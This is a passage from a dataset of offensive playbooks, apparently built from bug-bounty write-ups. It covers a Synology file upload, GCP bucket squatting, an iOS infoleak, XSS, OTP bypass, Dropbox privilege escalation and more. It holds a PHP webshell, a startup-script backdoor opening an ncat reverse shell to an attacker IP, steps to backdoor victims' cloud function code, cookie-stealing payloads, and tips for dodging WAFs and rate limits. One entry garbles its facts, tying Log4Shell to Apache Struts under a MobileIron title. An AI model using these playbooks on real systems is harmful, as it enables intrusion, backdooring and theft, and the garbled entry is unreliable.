Ability to read sensitive files like `/etc/shadow` or system configuration files that are not accessible by the web server user.
Successful execution of commands like `wget` or `curl` to download further exploitation tools, indicating an accessible network and command execution capability.
failure_indicators: Commands returning errors indicating permission denied (e.g., `id: permission denied`).
PHP execution fails with errors related to disabled functions (e.g., `shell_exec` is disabled).
The `whoami` command still returns the web server user, indicating no privilege escalation has occurred.

playbooks.impact: Local Privilege Escalation from a web server user to root (or another privileged user) on the target server. This allows the attacker to gain full control over the server, execute arbitrary code, steal data, and potentially pivot to other systems.
playbooks.key_lesson: Always investigate the server's PHP configuration (like suPHP) when you have shell access, as misconfigurations can lead to privilege escalation.

meta.title: Unauthenticated File upload Vulnerability on Synology Sub-domain

trigger_conditions.when_to_apply: This technique is applicable when a Synology subdomain is discovered and directory enumeration reveals an accessible '/upload/' directory, indicating a potential file upload endpoint.
prerequisites: Discovery of a *.synology.com subdomain.
applicability_signals: A 403 Forbidden error on the initial web application access followed by DIRB enumeration revealing a 200 OK on the /upload/ path.
skip_if: Directory enumeration does not reveal an accessible /upload/ directory or if the /upload/ directory returns a 403 Forbidden error.

recon_steps: Step 1: Perform DNS scan to discover subdomains of synology.com.
Step 2: Access discovered subdomains. If a 403 Forbidden error is encountered, proceed with directory enumeration.
Step 3: Use DIRB or similar tool to enumerate directories on the subdomain. Look for accessible directories like /upload/ that return a 200 OK status.
attack_steps: Step 1: Navigate to the discovered /upload/ endpoint.
Step 2: Upload a malicious PHP shell (e.g., webshell.php) without any file restrictions.
Step 3: Access the uploaded webshell at /upload/webshell.php.
Step 4: Execute commands like 'ls' to list files and directories.
Step 5: Execute commands like 'ifconfig' to gather network information.
payloads_or_patterns: A basic PHP webshell. The exact content is not specified, but it should allow command execution. Example: '<?php system($_GET['cmd']); ?>'
tools_recommended: DIRB: For directory and file enumeration.
Burp Suite: For intercepting and modifying HTTP requests during file upload.
success_indicators: Successful upload of the PHP webshell to the /upload/ directory.
Ability to execute commands (e.g., 'ls', 'ifconfig') through the uploaded webshell.
Listing of files and directories, and confirmation of internal network connectivity.
failure_indicators: The server returns a 403 Forbidden error when attempting to upload the file.
The server rejects files with common web shell extensions (.php, .phtml).
Successful upload but inability to execute commands through the webshell (e.g., due to strict `system()` function restrictions).

playbooks.impact: Attacker can upload and execute arbitrary files, including webshells, on the Synology server. This allows for remote code execution, potential data exfiltration, internal network pivoting, and complete server compromise.
playbooks.key_lesson: Always test file upload functionalities for unrestricted file uploads by attempting to upload web shells, even if the target application appears to have security measures in place.

meta.title: Cross-tenant Cloud Function compromise via storage bucket squatting

affected_components: Cloud Build, Cloud Storage buckets used for function sources
tech_stack_fingerprints: Google Cloud Functions usage inferred by presence of numeric project IDs and region identifiers in bucket naming conventions

trigger_conditions.when_to_apply: When an attacker knows a victim's Google Cloud numeric project ID and the target region, and the victim has no Cloud Functions deployed in that region.
prerequisites: Attacker knows the victim's numeric project ID.
Victim has no Cloud Functions deployed in the target region.
Attacker has the ability to create Google Cloud Storage buckets.
applicability_signals: The existence of a Google Cloud project with a known numeric project ID.
Knowledge of target regions for potential Cloud Function deployments.
skip_if: The target region already has Cloud Functions deployed by the victim (the bucket might already exist and be owned by the victim).

recon_steps: Step 1: Identify potential Google Cloud numeric project IDs for target organizations (e.g., through public disclosures, subdomain enumeration if project IDs are exposed).
attack_steps: Step 1: Create a Google Cloud Storage bucket with the naming convention `gcf-sources-<numeric-project-id>-<location>` (e.g., `gsutil mb gs://gcf-sources-928967777810-us-central1`).
Step 2: Grant public read/write access to the created bucket (e.g., `gsutil iam ch "allUsers:admin" gs://<attacker-controlled-bucket-name>`).
Step 3: Wait for the victim to deploy a Cloud Function in the target region. This will cause Cloud Build to upload the function source code to the attacker-controlled bucket.
Step 4: Download the `source.zip` file from the attacker-controlled bucket.
Step 5: Modify the downloaded `source.zip` file by injecting malicious code into the function's source files.
Step 6: Upload the backdoored `source.zip` file back to the attacker-controlled bucket, overwriting the original.
Step 7: Wait for the victim to redeploy their Cloud Function. If they deploy without noticing the modified source code, the backdoored function will execute.

Step 8: Alternatively, if the victim is creating a *new* function, their code upload will directly go to the attacker-controlled bucket. In this scenario, the attacker can simply provide a malicious `source.zip` from the start.
payloads_or_patterns: Malicious code snippets to be injected into the `source.zip` file (e.g., simple shell commands, reverse shells, data exfiltration logic).
tools_recommended: gsutil: For creating and managing Google Cloud Storage buckets and IAM policies.
zip/unzip tools: For manipulating the `source.zip` archive.
Code editor: For injecting malicious code into the function's source files.
success_indicators: The victim's Cloud Function deploys successfully, despite the source code being controlled by the attacker.
Observation of the backdoored code executing when the victim's Cloud Function is invoked.
Receipt of callbacks from the backdoored Cloud Function (e.g., reverse shell connection, exfiltrated data to an attacker-controlled endpoint).
failure_indicators: The victim's Cloud Function fails to deploy with an error related to bucket access or object integrity, indicating the bucket name might already be in use by Google or the victim.
Cloud Build explicitly rejects the upload if bucket permissions are not correctly configured by the attacker.

playbooks.impact: An attacker can read the source code of Cloud Functions deployed by a victim, and inject malicious code into these functions. This allows for potential execution of arbitrary code within the victim's cloud environment, leading to data exfiltration, denial of service, or further compromise of the victim's Google Cloud project.
playbooks.key_lesson: When interacting with cloud services that use predictable naming conventions for resource identifiers (like storage buckets), attackers can attempt to preemptively register these identifiers to hijack or manipulate the intended resource usage by other users or services.

meta.title: Remote code execution in import image task via storage bucket squatting

target_profile.technology: Google Cloud Platform (GCP) Compute Engine Image Tools
target_profile.required_access_level: attacker must know the project ID of their victim

trigger_conditions.when_to_apply: When an attacker knows a victim's GCP project ID and can register a GCS bucket with a predictable name before the victim uses the image import/export functionality.
prerequisites: Attacker knows the victim's GCP Project ID.
The victim has not previously created the 'scratch' storage bucket for image import/export (e.g., <project-id>-daisy-bkt or <project-id>-daisy-bkt-us).
Attacker has the ability to create Google Cloud Storage buckets.
applicability_signals: The existence of the `gcloud compute images import` or `gcloud compute images export` commands in the target environment.
Documentation or observable usage of 'scratch' storage buckets for import/export tasks with predictable naming conventions: `<project-id>-daisy-bkt` (import) or `<project-id>-daisy-bkt-us` (export).
skip_if: The target project already has the expected scratch bucket pre-created.
The target environment does not use the `gcloud compute images import/export` commands or similar services that rely on predictable storage bucket names.
The target organization has strict policies preventing the creation of buckets with such naming patterns or public access.

recon_steps: Step 1: Identify a target GCP project ID. This might be obtained through information disclosure, public documentation, or other reconnaissance methods.

Step 2: Attempt to list or query the existence of the expected scratch buckets (`<project-id>-daisy-bkt` and `<project-id>-daisy-bkt-us`) using `gsutil ls gs://<project-id>-daisy-bkt/`. If the bucket does not exist, it's a potential target.
Step 3: Check if Cloud Functions are enabled or commonly used within the target's GCP project for event-driven automation.
attack_steps: Step 1: Create a Google Cloud Storage bucket with the name predicted for the victim's project: `gsutil mb gs://<VICTIM_PROJECT_ID>-daisy-bkt`.

Step 2: Grant public read/write access to the newly created bucket: `gsutil iam ch "allUsers:admin" gs://<VICTIM_PROJECT_ID>-daisy-bkt`. (Note: More granular permissions like `storage.buckets.list`, `storage.objects.get`, and `storage.objects.create` are sufficient and recommended.)
Step 3: Set up a Cloud Function triggered by object creation in the attacker-controlled bucket. The function should monitor for files like `startup_script` or `.sh` files.

Step 4: Within the Cloud Function, if a startup script or related file is uploaded by the victim's import process, check if it has already been backdoored. If not, replace the content with a malicious shell script (e.g., a reverse shell using `ncat`).

Step 5: Instruct the victim to run the `gcloud compute images import` command targeting their project. This will cause the `compute-image-tools` to create files, including a startup script, in the attacker-controlled bucket.
payloads_or_patterns:
Backdoor shell script: `#!/bin/bash
apt-get update
apt-get install -y nmap ncat
ncat -e /bin/bash <ATTACKER_IP> 4444`
Cloud Function Python code for backdooring uploaded scripts.
tools_recommended: gsutil: For creating and managing Google Cloud Storage buckets and IAM policies.
Google Cloud Functions: For automating the response to file uploads in the GCS bucket.
A listener (e.g., netcat) on the attacker's machine to receive the reverse shell.
success_indicators: The Cloud Function successfully detects and modifies the uploaded `startup_script` (or similar files).
The victim's instance launches with the backdoored startup script.
An incoming connection is received on the attacker's listener on the specified port (e.g., `4444`).
An interactive shell is obtained on an instance within the victim's GCP project, running with the `cloudbuild.gserviceaccount.com` credentials.
failure_indicators: The attacker is unable to create the GCS bucket (e.g., name is already taken, policy violation). Suggest trying a different project ID or looking for alternative attack vectors.

The victim's import process does not result in the creation of a `startup_script` or related files in the bucket. Suggest investigating the specific `compute-image-tools` version or workflow being used.

No reverse shell connection is received. Suggest verifying the Cloud Function logic, the backdoor script, firewall rules, and network connectivity between the victim's instance and the attacker's listener.

playbooks.impact: Remote Code Execution (RCE) on a victim's Google Cloud Compute Engine instance, running with the privileges of the project's `cloudbuild.gserviceaccount.com` service account. This allows the attacker to execute arbitrary commands within the victim's project, potentially leading to further compromise, data exfiltration, or lateral movement within the GCP environment.
playbooks.key_lesson: When interacting with cloud storage, assume that predictable naming conventions for resources can be abused if not properly secured or validated, especially when they are used by automated build or deployment pipelines.

meta.title: CVE-2020-9964 - An iOS infoleak

tech_stack_fingerprints: Kernel memory addresses visible in crash logs or debugging information

trigger_conditions.when_to_apply: When a local user process can interact with the IOSurfaceAccelerator user client and exploit a memory initialization issue in the `user_get_histogram` method.
prerequisites: The target device is running a vulnerable version of iOS.
The attacker has the ability to execute code within the iOS App Sandbox.
applicability_signals: The existence of the `IOSurfaceAcceleratorClient` user client accessible from the App Sandbox.
The `user_get_histogram` external method (method 9) takes 8 bytes of input data.
skip_if: The `IOSurfaceAcceleratorClient` user client is not available or accessible from the App Sandbox.
The `user_get_histogram` method is not present or is patched.

recon_steps: Step 1: Identify the `IOSurfaceAcceleratorClient` user client as a potential entry point for sandbox escapes or kernel interactions.
Step 2: Analyze the external methods of `IOSurfaceAcceleratorClient`, specifically method 9 (`user_get_histogram`), and its IOExternalMethod descriptor.
attack_steps: Step 1: Craft an input of 8 bytes for the `user_get_histogram` method. The first 8 bytes of this input should be a userspace pointer to a buffer allocated by the attacker.
Step 2: Call the `user_get_histogram` method (method 9) using the crafted input.

Step 3: The `IOSurfaceAcceleratorClient::user_get_histogram` function will create an `IOMemoryDescriptor` using the provided userspace pointer and size (implicitly derived from the method descriptor or potentially a separate mechanism).
Step 4: The `AppleM2ScalerCSCDriver::get_histogram` function will then be called, which attempts to write data from `client->histogramBuffer` into the attacker-controlled `IOMemoryDescriptor`.
Step 5: Since `client->histogramBuffer` is uninitialized due to `IOMalloc` not zeroing memory and insufficient initialization in `initClient`, it will contain arbitrary kernel memory contents.
Step 6: The attacker receives this uninitialized memory back, which can contain sensitive kernel addresses (e.g., mach port addresses for exploiting other vulnerabilities or defeating kASLR).
payloads_or_patterns: Input data for `user_get_histogram` method: 8 bytes representing a userspace pointer. Example: `0xdeadbeef00000000` (replace with actual allocated buffer address)
tools_recommended: Reverse engineering tools (IDA Pro, Ghidra) to analyze kernel code.
iOS debugging tools (lldb) for analyzing memory dumps and understanding kernel structures.
Custom exploit development framework for interacting with kernel user clients.
success_indicators: Received data in the attacker-controlled buffer contains recognizable kernel memory addresses, such as addresses of kernel task ports or other kernel objects.
The received data is not consistently zeroed out and contains varied patterns indicative of uninitialized memory.
failure_indicators: The received data is all zeros or consistent garbage values that do not reveal useful information.
The target process crashes before or during the method call.
A `kIOReturnNoMemory` or other error is returned, indicating failure to prepare the memory descriptor.

playbooks.impact: Leaking of uninitialized kernel memory, which can expose sensitive kernel addresses. This information can be crucial for further exploitation, such as bypassing kernel address space layout randomization (kASLR) or targeting other memory corruption vulnerabilities to achieve arbitrary code execution in the kernel.
playbooks.key_lesson: Always verify memory allocation and initialization routines in kernel drivers, especially when dealing with user client interfaces, to prevent information disclosure through uninitialized memory.

meta.title: Reflected XSS via a hidden parameter on Dutch Gov. website

target_profile.technology: PHP (inferred from writeup mentioning PHP website)

trigger_conditions.when_to_apply: When a web application uses GET parameters and reflects their values directly into the HTML source code within a SCRIPT tag without proper encoding.
prerequisites: Target website is using GET requests with parameters.
applicability_signals: Existence of GET parameters that are reflected in the HTML source code.
The reflected parameter's value is embedded within a SCRIPT tag.
skip_if: All GET parameters are properly HTML encoded.
Parameters are not reflected in the HTML source code.
WAF blocks suspicious payloads.

recon_steps: Step 1: Browse the target website using a web proxy (e.g., Burp Suite) to observe all GET requests and their parameters.
Step 2: Use a tool like Arjun, param-miner, or parameth to discover hidden GET parameters on the application.
Step 3: Analyze the HTML source code of pages containing discovered parameters, specifically looking for reflections within SCRIPT tags.
attack_steps: Step 1: Once a parameter is identified that reflects its value within a SCRIPT tag, craft a payload to close the current SCRIPT tag, open a new one, and inject JavaScript.
Step 2: Send a GET request to the target URL with the crafted payload appended to the vulnerable parameter.
Step 3: If successful, observe the execution of the injected JavaScript in the browser.
tools_recommended: Burp Suite (for proxy and analysis)
Arjun (for parameter discovery)
param-miner (Burp Suite extension for parameter discovery)
parameth (for parameter discovery)
success_indicators: The JavaScript alert box with 'RXSS' is displayed in the browser.
A request is received at a specified Collaborator URL containing the user's session cookies.
failure_indicators: No alert box is displayed and no cookies are exfiltrated. This indicates that the parameter might not be reflected, is not reflected within a script tag, or is being improperly encoded. Pivot to looking for other reflected parameters or other types of vulnerabilities.
A 403 Forbidden response is received, indicating a WAF might be blocking the payload. Try URL encoding or different payloads.

playbooks.impact: Execution of arbitrary JavaScript in the context of the user's browser. This can lead to session hijacking by stealing cookies, performing actions on behalf of the user, redirecting the user to malicious websites, or displaying phishing content.
playbooks.key_lesson: Always scan for hidden GET parameters and meticulously examine their reflection points in the HTML source, especially within SCRIPT tags, as they are common vectors for Reflected XSS.

meta.title: My First Bug Bounty From Bug Bounty Platform redstorm.io

trigger_conditions.when_to_apply: When a user registration process requires phone number verification via SMS OTP and the OTP validation endpoint does not properly check the OTP against the expected value, allowing for arbitrary numeric inputs.
prerequisites: Attacker must be able to register an account or have access to a user account that requires phone verification.
applicability_signals: Encountering an OTP verification step during user registration or account recovery.
Observing requests containing 'csrf_token' and 'pin' parameters during OTP submission.
skip_if: The OTP verification process involves more than just a simple numeric PIN (e.g., time-based codes, cryptographic challenges).
The server validates the OTP against a pre-defined or time-sensitive code that cannot be brute-forced or bypassed with arbitrary inputs.

recon_steps: Step 1: Navigate to the account registration or phone verification section of the target application.
Step 2: Identify the HTTP requests made when submitting the OTP, noting the parameters involved (e.g., csrf_token, pin).
attack_steps: Step 1: Capture the OTP submission request using a proxy (e.g., Burp Suite).
Step 2: Send the captured request to the Repeater tool.
Step 3: Replace the OTP value in the 'pin' parameter with a sequence of random 6-digit numbers.
Step 4: Send the modified request to the server and observe the response.
Step 5: If the response indicates successful verification (e.g., success message), report the vulnerability.
tools_recommended: Burp Suite Repeater: To intercept, modify, and re-send OTP verification requests.
success_indicators: Response containing a success message such as 'Terima kasih, verifikasi telah berhasil!' or equivalent.
Successful bypass of the OTP verification, allowing the user to proceed to the next step (e.g., account dashboard).
failure_indicators: Repeated 'invalid OTP' or similar error messages for all tested numeric inputs → the OTP validation is likely secure or requires specific codes. Consider alternative attack vectors.
A 403 Forbidden or similar access denied response → there might be rate limiting or IP-based blocking in place. Consider using a VPN or proxy rotation.

playbooks.impact: Bypassing One-Time Password (OTP) verification allows an attacker to gain unauthorized access to user accounts without knowing the legitimate OTP, potentially leading to account takeover, data theft, or fraudulent transactions.
playbooks.key_lesson: When testing OTP verification mechanisms, always attempt to bypass the validation by submitting arbitrary numeric sequences or predictable patterns, as servers may not adequately validate the OTP against the correct, time-sensitive code.

meta.title: Dropbox Escalation of Privileges to SYSTEM on Windows

trigger_conditions.when_to_apply: When a low-privilege user has write access to the Dropbox updater log directory on a Windows machine with the Dropbox client installed.
prerequisites: Dropbox client for Windows is installed on the target machine.
The attacker has a low-privilege user account on the target machine.
The Dropbox updater process runs with SYSTEM privileges and writes to a user-writable log directory.
applicability_signals: Procmon reveals Dropbox updater process writes to C:\ProgramData\Dropbox\Update\Log
Permissions on C:\ProgramData\Dropbox\Update\Log allow non-privileged users to write to it.
Permissions on log files created by the updater process allow any user to modify them.
skip_if: The Dropbox updater does not run with SYSTEM privileges.
The Dropbox updater log directory or its files are not writable by low-privilege users.
Dropbox has been updated to a patched version.

recon_steps: Step 1: Use Process Monitor (Procmon) to monitor the Dropbox updater process behavior.
Step 2: Identify the log directory written to by the updater process (e.g., C:\ProgramData\Dropbox\Update\Log).
Step 3: Check the file system permissions of the identified log directory and the log files created within it to confirm if low-privilege users have write access.
attack_steps: Step 1: Use James Forshaw's CreateMountPoint tool to create an NTFS junction from the Dropbox updater log directory (e.g., C:\ProgramData\Dropbox\Update\Log) to a critical system directory like C:\Windows\System32.
Step 2: Trigger the Dropbox updater process (e.g., by manually starting it or waiting for an automatic update).
Step 3: The updater will write log files to C:\Windows\System32 due to the created junction.

Step 4: With write permissions on the log files in C:\Windows\System32, replace the log file with a malicious payload designed to achieve privilege escalation to SYSTEM (details of the payload are not disclosed in the writeup).
payloads_or_patterns:
Command to create junction: .\CreateMountPoint.exe C:\ProgramData\Dropbox\Update\Log C:\Windows\System32
(Note: The actual malicious payload is not specified in the writeup)
tools_recommended: Procmon (SysInternals Suite)
CreateMountPoint (James Forshaw's Symbolic Link Testing Tools)
success_indicators: Log files from the Dropbox updater process appear in C:\Windows\System32.
The attacker successfully achieves SYSTEM privileges on the target machine after the log file is replaced with malicious content.
failure_indicators: CreateMountPoint fails to create the junction (e.g., due to permissions on the target directory).
Dropbox updater does not write to the log directory after the junction is created.
The attacker cannot achieve SYSTEM privileges after attempting exploitation (suggests the malicious payload is incorrect or the technique is insufficient on its own).

playbooks.impact: An attacker with low-privilege access to a Windows machine can escalate their privileges to SYSTEM, gaining complete control over the machine.
playbooks.key_lesson: Always investigate file write operations performed by privileged processes, especially to user-writable directories, as they can be a vector for local privilege escalation using techniques like NTFS junctions or symbolic links.

meta.title: Exploiting a "Useless" Cookie-Based XSS and Making it Useful

trigger_conditions.when_to_apply: When a web application reflects user-controlled input from a cookie into the HTML, and the web server accepts commas as cookie delimiters, and the main application's cookies are sent to subdomains where the XSS occurs.
prerequisites: Attacker can set a cookie on the victim's browser via CSRF or another vulnerability.
The target web server accepts commas as delimiters in the 'Cookie' header, in addition to semicolons.
The main application's domain cookies are sent to the subdomain hosting the XSS vulnerability.
applicability_signals: A cookie value is reflected unescaped in the HTML source code.
A cookie like 'csrf' is reflected in JavaScript.
Changing language preference results in a 'Set-Cookie' header.
The target application's cookies have a broad domain (e.g., '.example.com').
skip_if: The web server strictly uses semicolons as the only cookie delimiter.
The XSS payload is only reflected on a subdomain that does not receive cookies from the main application.
The cookie reflection is properly neutralized (e.g., properly encoded).

recon_steps: Step 1: Identify reflected cookie values by injecting payloads like `test'-alert(1)-'` into cookies and observing the response.
Step 2: Test if the server accepts commas as cookie delimiters by sending a cookie like `lang=val1,val2` and observing if it's parsed as two cookies or one.
Step 3: Check the 'Domain' attribute of cookies set by the main application to see if they are valid for subdomains where XSS might be present.
Step 4: Test if double quotes within cookie values are handled specially by the server, preventing delimiter interpretation.
attack_steps: Step 1: Craft a CSRF request to the '/lang.php' endpoint (or equivalent) to set the 'lang' cookie. The value should be designed to inject a malicious payload into the 'csrf' cookie. For example: `lang=z,csrf='-alert(document.domain)-'&csrf=ignored`.

Step 2: When the victim visits the page, the browser sends a 'Cookie' header containing the crafted 'lang' cookie. The server parses this as `lang=it` and `csrf='-alert(document.domain)-'`. The injected payload in the 'csrf' cookie is then reflected.

Step 3: To steal session cookies, modify the CSRF request to inject a malicious 'csrf' cookie that includes the victim's actual 'csrf' cookie value, ensuring it's quoted to prevent delimiter issues. For example, use `lang=z,csrf='<VICTIM_CSRF_COOKIE_VALUE>'-alert(1)-'&csrf=ignored`.

Step 4: Further refine the payload to include other cookies by using the server's handling of double quotes. The goal is to construct a request that, when processed by the server, places all desired cookies within the 'csrf' cookie's value. Example payload construction in CSRF: `POST /lang.php HTTP/1.1 ... lang=z,csrf="<VICTIM_CSRF_COOKIE_VALUE>'; alert(document.cookie); //"&csrf=ignored`.
payloads_or_patterns:
Exploiting double quotes and cookie injection: `POST /lang.php HTTP/1.1
Host: boring.xss.long.lat
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

lang=z,csrf="<VICTIM_CSRF_COOKIE_VALUE>; alert(document.cookie); //"&csrf=ignored`
tools_recommended: Burp Suite: To intercept and modify HTTP requests, especially CSRF requests.
Custom script: To automate the generation of CSRF payloads and test cookie delimiter behavior.
success_indicators: An alert box pops up showing `document.domain`.
An alert box pops up showing `document.cookie` containing session tokens.
A callback to an attacker-controlled server with the stolen cookies.
failure_indicators: No alert box appears, and `document.cookie` is not displayed.
The server rejects the comma-delimited cookie.
The injected payload is correctly sanitized or encoded.
HTTP 400 Bad Request for malformed cookies.

playbooks.impact: Stealing session cookies (including HttpOnly cookies) of other authenticated users, leading to account takeover.
playbooks.key_lesson: Investigate cookie parsing anomalies, especially unusual delimiters (like commas), and how they interact with cookie domain attributes to chain vulnerabilities and achieve impactful exploits.

meta.title: Firefox for Android: LAN Based Intent Triggering

tech_stack_fingerprints: Firefox for Android version 68.11.0 and below

trigger_conditions.when_to_apply: The target must be running a vulnerable version of Firefox for Android (68.11.0 and below) and be connected to the same local network as the attacker.
prerequisites: Target device has Firefox for Android v68.11.0 or below installed and running.
Attacker is on the same local network (e.g., WiFi) as the target.
applicability_signals: Target device is observed on the network.
SSDP discovery messages are detected originating from the target device.
skip_if: Target device is running Firefox for Android version 79 or above.
Target device is not connected to the local network.

recon_steps: Step 1: Scan the local network for devices running vulnerable Firefox for Android versions.
Step 2: Observe network traffic for SSDP discovery messages (UDP multicast to 239.255.255.250) from potential targets.
attack_steps: Step 1: Set up a malicious SSDP server on the attacker's machine.
Step 2: Configure the SSDP server to respond to SSDP discovery messages from Firefox for Android with a crafted response containing an Android intent URI.
Step 3: The vulnerable Firefox application on the target device will process the malicious SSDP response and invoke the intent URI.
payloads_or_patterns:
M-SEARCH * HTTP/1.1
Host: 239.255.255.250:1900
ST: roku:ecp
Man: "ssdp:discover"
MX: 3

HTTP/1.1 200 OK
CACHE-CONTROL: max-age=1800
DATE: Tue, 16 Oct 2018 20:17:12 GMT
EXT:
LOCATION: intent://<TARGET_URL>/#Intent;scheme=http;package=org.mozilla.firefox;end
OPT: "http://schemas.upnp.org/upnp/1/0/"; ns=01
01-NLS: uuid:7f7cc7e1-b631-86f0-ebb2-3f4504b58f5c
SERVER: UPnP/1.0
ST: roku:ecp
USN: uuid:7f7cc7e1-b631-86f0-ebb2-3f4504b58f5c::upnp:rootdevice
BOOTID.UPNP.ORG: 0
CONFIGID.UPNP.ORG: 1
tools_recommended: evil-ssdp (modified for this vulnerability)
Wireshark (to observe SSDP traffic)
success_indicators: The target device's browser application launches to the specified <TARGET_URL> without user interaction.
Another application specified in the intent URI is launched.
failure_indicators: No response to SSDP discovery messages.
Firefox for Android does not process the LOCATION header as an intent URI.
Firewall blocking UDP multicast traffic.

playbooks.impact: Attacker can trigger arbitrary Android intents on a target device without user interaction, leading to the launch of specific applications, web browsing to attacker-controlled URLs, or execution of other actions permitted by the invoked intent. This can be used for phishing, redirecting users to malicious sites, or launching other apps for further exploitation.
playbooks.key_lesson: Always validate and sanitize network-based discovery responses, especially those that can trigger local application intents, to prevent unintended application launches and potential abuse.

meta.title: How I Hacked Facebook Again! Unauthenticated RCE on MobileIron MDM

trigger_conditions.when_to_apply: When the target application is identified as using Apache Struts 2 and is exposed to the internet, potentially without proper authentication, and specific vulnerable versions are in use.
prerequisites: Target uses Apache Struts 2 (versions susceptible to CVE-2021-44228)
Application is accessible over the internet
applicability_signals: Application responds to requests on standard web ports (80, 443)
Potential for logging or processing of user-controlled input that could be part of a JNDI lookup
skip_if: Target is behind a Web Application Firewall (WAF) that effectively blocks JNDI injection attempts
Application logs are not accessible or controllable by the attacker
Target is confirmed to be on a patched version of Apache Struts 2

recon_steps: Step 1: Identify potential target endpoints and their HTTP response headers for technology fingerprints (e.g., 'Server', 'X-Powered-By').
Step 2: Probe common web directories and files to identify the presence of Java-based applications, specifically looking for signs of Apache Struts 2 framework.
attack_steps: Step 1: Craft a malicious JNDI lookup payload targeting the Log4Shell vulnerability (CVE-2021-44228).

Step 2: Send an HTTP request to a vulnerable endpoint on the target, injecting the JNDI payload into a parameter that is likely to be logged or processed by Log4j. For example, a 'User-Agent' header or a POST request body parameter.
Step 3: Monitor a controlled server (e.g., Burp Collaborator or a custom LDAP/RMI server) for incoming connections originating from the target application.
Step 4: If a connection is received, analyze the inbound request for signs of successful JNDI resolution and potential class loading.
Step 5: If initial RCE is confirmed (e.g., reverse shell callback), attempt to enumerate system information and escalate privileges.
tools_recommended: Burp Suite: To intercept, modify, and send HTTP requests.
Burp Collaborator or Interactsh: To receive inbound connections from the target.
Custom LDAP/RMI server: For advanced testing and exploitation of JNDI lookups.
Log4j-Exploit-Payload: For generating various JNDI payloads.
success_indicators: Inbound connection to the attacker-controlled server (LDAP, RMI, DNS) from the target IP address.
Successful retrieval of a malicious Java class file via the JNDI lookup.
Execution of arbitrary commands on the target server (e.g., reverse shell connection).
failure_indicators: No inbound connections to the attacker's server.
Application crashes or returns an error without any outbound network activity.
WAF block page or specific error code (e.g., 403 Forbidden).

playbooks.impact: Unauthenticated Remote Code Execution (RCE) on the target server, allowing the attacker to control the compromised system, access sensitive data, exfiltrate information, and potentially pivot to other internal systems.
playbooks.key_lesson: Always test for critical Java logging vulnerabilities like Log4Shell (CVE-2021-44228) by attempting JNDI injection into any user-controlled input processed by the application, especially if Apache Struts or other Java frameworks are suspected.

meta.title: Universal XSS in Android WebView (CVE-2020-6506)

affected_components: Android applications utilizing Android WebView with default configurations
tech_stack_fingerprints: Apps running on systems with Android WebView version prior to 83.0.4103.106 Stable

trigger_conditions.when_to_apply: This technique applies to Android applications that use Android WebView with default configurations and run on systems with an unpatched version of Android WebView (prior to 83.0.4103.106 Stable).
prerequisites: The target application must use Android WebView.
The Android WebView version on the target device must be prior to 83.0.4103.106.
WebSettings.setSupportMultipleWindows() must be set to default (false) or explicitly set to false.
applicability_signals: Presence of Android WebView component in the application.
Observation of default or explicitly false `setSupportMultipleWindows()` setting.
Specific Android WebView version identified through app analysis or device information.
skip_if: The Android WebView version is 83.0.4103.106 or higher.
WebSettings.setSupportMultipleWindows() is set to true.
